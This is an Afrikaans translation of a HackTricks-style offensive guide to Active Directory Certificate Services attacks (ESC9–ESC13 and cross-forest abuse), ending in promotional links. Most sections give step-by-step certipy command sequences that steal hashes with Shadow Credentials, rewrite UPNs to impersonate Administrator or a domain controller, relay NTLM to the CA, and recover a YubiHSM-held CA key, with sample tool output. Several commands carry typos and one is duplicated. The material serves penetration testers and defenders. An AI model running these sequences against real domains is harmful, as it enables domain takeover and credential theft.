## Geen Sekuriteitsuitbreiding - ESC9 <a href="#id-5485" id="id-5485"></a>

### Verduideliking

Die nuwe waarde **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) vir **`msPKI-Enrollment-Flag`**, bekend as ESC9, voorkom die inkapseling van die **nuwe `szOID_NTDS_CA_SECURITY_EXT` sekuriteitsuitbreiding** in 'n sertifikaat. Hierdie vlag word relevant wanneer `StrongCertificateBindingEnforcement` ingestel is op `1` (die verstekinstelling), wat teenstrydig is met 'n instelling van `2`. Sy belangrikheid word verhoog in scenario's waar 'n swakker sertifikaatkoppeling vir Kerberos of Schannel benut kan word (soos in ESC10), aangesien die afwesigheid van ESC9 nie die vereistes sou verander nie.

Die omstandighede waarin hierdie vlag se instelling betekenisvol word, sluit in:

- `StrongCertificateBindingEnforcement` is nie aangepas na `2` (met die verstek wees `1`), of `CertificateMappingMethods` sluit die `UPN` vlag in.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag binne die `msPKI-Enrollment-Flag` instelling.
- Enige kliëntverifikasie EKU word deur die sertifikaat gespesifiseer.
- `GenericWrite` toestemmings is beskikbaar oor enige rekening om 'n ander te compromitteer.

### Misbruikscenario

Stel `John@corp.local` het `GenericWrite` toestemmings oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te compromitteer. Die `ESC9` sertifikaatsjabloon, waarin `Jane@corp.local` toegelaat word om in te skryf, is gekonfigureer met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag in sy `msPKI-Enrollment-Flag` instelling.

Aanvanklik word `Jane` se hasj verkry deur Shadow Credentials, danksy `John` se `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Daarna word `Jane` se `userPrincipalName` gewysig na `Administrator`, met die doel om die `@corp.local` domein gedeelte doelbewus weg te laat:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie wysiging oortree nie beperkings nie, aangesien `Administrator@corp.local` behou word as `Administrator` se `userPrincipalName`.

Hierna word die `ESC9` sertifikaatsjabloon, wat as kwesbaar gemerk is, aangevra as `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Dit word opgemerk dat die sertifikaat se `userPrincipalName` `Administrator` weerspieël, sonder enige "object SID".

`Jane` se `userPrincipalName` word dan teruggekeer na haar oorspronklike, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Poging tot verifikasie met die uitgereikte sertifikaat lewer nou die NT-hash van `Administrator@corp.local` op. Die bevel moet `-domain <domain>` insluit weens die sertifikaat se gebrek aan domeinspesifikasie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Swakke Sertifikaat Afbeeldings - ESC10

### Verduideliking

Twee register sleutelwaardes op die domeinbeheerder word deur ESC10 genoem:

* Die verstekwaarde vir `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), voorheen ingestel op `0x1F`.
* Die verstek instelling vir `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, voorheen `0`.

**Geval 1**

Wanneer `StrongCertificateBindingEnforcement` ingestel is as `0`.

**Geval 2**

Indien `CertificateMappingMethods` die `UPN` bit (`0x4`) insluit.

### Misbruik Geval 1

Met `StrongCertificateBindingEnforcement` ingestel as `0`, kan 'n rekening A met `GenericWrite` toestemmings benut word om enige rekening B te kompromiteer.

Byvoorbeeld, met `GenericWrite` toestemmings oor `Jane@corp.local`, poog 'n aanvaller om `Administrator@corp.local` te kompromiteer. Die prosedure weerspieël ESC9, wat enige sertifikaatsjabloon toelaat om gebruik te word.

Aanvanklik word `Jane` se hasj opgehaal deur Shadow Credentials te misbruik, wat die `GenericWrite` uitbuit.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Daarna word `Jane` se `userPrincipalName` verander na `Administrator`, doelbewus om die `@corp.local` gedeelte uit te laat om 'n beperkingsoortreding te vermy.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Volgens hierdie, word 'n sertifikaat wat kliëntverifikasie moontlik maak aangevra as `Jane`, met behulp van die verstek `Gebruiker` templaat.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word dan teruggekeer na sy oorspronklike, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die verifikasie met die verkrygte sertifikaat sal die NT-hash van `Administrator@corp.local` lewer, wat die spesifisering van die domein in die bevel noodsaak as gevolg van die afwesigheid van domeinbesonderhede in die sertifikaat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Misbruikgeval 2

Met die `CertificateMappingMethods` wat die `UPN`-bitvlag (`0x4`) bevat, kan 'n rekening A met `GenericWrite`-toestemmings enige rekening B kompromitteer wat 'n `userPrincipalName`-eienskap ontbreek, insluitend masjienrekeninge en die ingeboude domein-administrateur `Administrator`.

Hier is die doel om `DC$@corp.local` te kompromitteer, beginnende met die verkryging van `Jane` se has through Shadow Credentials, deur gebruik te maak van die `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` se `userPrincipalName` word toe dan ingestel as `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
'n Sertifikaat vir klientverifikasie word aangevra as `Jane` deur die verstek `Gebruiker` sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word teruggekeer na sy oorspronklike waarde na hierdie proses.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Om te verifieer via Schannel, word Certipy se `-ldap-shell` opsie gebruik, wat die suksesvolle verifikasie aandui as `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Deur die LDAP shell, stel opdragte soos `set_rbcd` Resource-Based Constrained Delegation (RBCD) aanvalle in werking, wat moontlik die domeinbeheerder kan benadeel.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hierdie kwesbaarheid strek ook tot enige gebruikersrekening wat 'n `userPrincipalName` kortkom of waar dit nie ooreenstem met die `sAMAccountName` nie, met die verstek `Administrator@corp.local` wat 'n primêre teiken is weens sy verhoogde LDAP-voorregte en die afwesigheid van 'n `userPrincipalName` per verstek.

## NTLM-relaying na ICPR - ESC11

### Verduideliking

As die CA-bediener nie ingestel is met `IF_ENFORCEENCRYPTICERTREQUEST` nie, kan dit NTLM-relay-aanvalle maak sonder om te onderteken via RPC-diens. [Verwysing hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Jy kan `certipy` gebruik om te ontleed of `Enforce Encryption for Requests` uitgeschakel is en certipy sal `ESC11` kwesbaarhede wys.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Misbruik Scenario

Dit is nodig om 'n relê-diens op te stel:
``` bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Vir domeinbeheerders moet ons `-template` spesifiseer in DomainController.

Of gebruik [sploutchy se fork van impacket](https://github.com/sploutchy/impacket):
``` bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Skeltoegang tot ADCS CA met YubiHSM - ESC12

### Verduideliking

Administrateurs kan die Sertifikaatowerheid opstel om dit op 'n eksterne toestel soos die "Yubico YubiHSM2" te stoor.

As die USB-toestel aan die CA-bediener gekoppel is via 'n USB-poort, of 'n USB-toestelbediener in die geval waar die CA-bediener 'n virtuele masjien is, is 'n verifikasiesleutel (soms verwys as 'n "wagwoord") nodig vir die Sleutelbergingverskaffer om sleutels in die YubiHSM te genereer en te gebruik.

Hierdie sleutel/wagwoord word in die register onder `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in teks bewaar.

Verwysing na [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Misbruikscenario

As die CA se privaatsleutel op 'n fisiese USB-toestel gestoor word wanneer jy skeltoegang het, is dit moontlik om die sleutel te herwin.

Eerstens moet jy die CA-sertifikaat verkry (dit is openbaar) en dan:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## OID Groep Skakel Misbruik - ESC13

### Verduideliking

Die `msPKI-Certificate-Policy` eienskap maak dit moontlik om die uitreikingsbeleid by die sertifikaatsjabloon te voeg. Die `msPKI-Enterprise-Oid` voorwerpe wat verantwoordelik is vir die uitreikingsbeleide kan ontdek word in die Konfigurasie Naamkonteks (CN=OID,CN=Public Key Services,CN=Services) van die PKI OID-houer. 'n Beleid kan aan 'n AD-groep gekoppel word deur hierdie voorwerp se `msDS-OIDToGroupLink` eienskap te gebruik, wat 'n stelsel in staat stel om 'n gebruiker te magtig wat die sertifikaat voorlê asof hy 'n lid van die groep is. [Verwysing hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Met ander woorde, wanneer 'n gebruiker toestemming het om 'n sertifikaat in te skryf en die sertifikaat aan 'n OID-groep gekoppel is, kan die gebruiker die voorregte van hierdie groep erf.

Gebruik [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) om OIDToGroupLink te vind:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Misbruik Scenario

Vind 'n gebruikerspermissie wat gebruik kan word met `certipy find` of `Certify.exe find /showAllPermissions`.

As `John` toestemming het om `VulnerableTemplate` in te skryf, kan die gebruiker die voorregte van die `VulnerableGroup` groep erf.

Al wat dit hoef te doen is om die templaat te spesifiseer, en dit sal 'n sertifikaat met OIDToGroupLink-regte kry.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kompromittering van Bosse met Sertifikate Verduidelik in Passiewe Stem

### Verbreek van Bosvertroue deur Gekompromitteerde CA's

Die konfigurasie vir **kruisbos inskrywing** is relatief maklik. Die **wortel CA sertifikaat** van die hulpbronbos word **gepubliseer na die rekeningbosse** deur administrateurs, en die **ondernemings CA** sertifikate van die hulpbronbos word **bygevoeg tot die `NTAuthCertificates` en AIA houers in elke rekeningbos**. Om dit te verduidelik, verleen hierdie reëling die **CA in die hulpbronbos volledige beheer** oor al die ander bosse waarvoor dit PKI bestuur. Indien hierdie CA deur aanvallers **gekompromitteer word**, kan sertifikate vir alle gebruikers in beide die hulpbron- en rekeningbosse deur hulle **gefabriseer word**, wat dus die sekuriteitsgrens van die bos verbreek.

### Inskrywingsregte Verleen aan Buitelandse Prinsipale

In multi-bos omgewings is versigtigheid nodig met betrekking tot Ondernemings CA's wat **sertifikaatsjablone publiseer** wat **Geautentiseerde Gebruikers of buitelandse prinsipale** (gebruikers/groepe ekstern aan die bos waaraan die Ondernemings CA behoort) **inskrywings- en wysigingsregte** toelaat.\
Met verifikasie oor 'n vertroue, word die **Geautentiseerde Gebruikers SID** by die gebruiker se token deur AD gevoeg. Dus, indien 'n domein 'n Ondernemings CA besit met 'n sjabloon wat **Geautentiseerde Gebruikers inskrywingsregte toelaat**, kan 'n sjabloon moontlik **deur 'n gebruiker van 'n ander bos ingeskryf word**. Net so, indien **inskrywingsregte eksplisiet aan 'n buitelandse prinsipaal verleen word deur 'n sjabloon**, word 'n **kruisbos toegangsbeheer-verhouding daardeur geskep**, wat 'n prinsipaal van een bos in staat stel om **in te skryf in 'n sjabloon van 'n ander bos**.

Beide scenario's lei tot 'n **toename in die aanvalsoppervlak** van die een bos na die ander. Die instellings van die sertifikaatsjabloon kan deur 'n aanvaller uitgebuit word om addisionele voorregte in 'n vreemde domein te verkry.

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
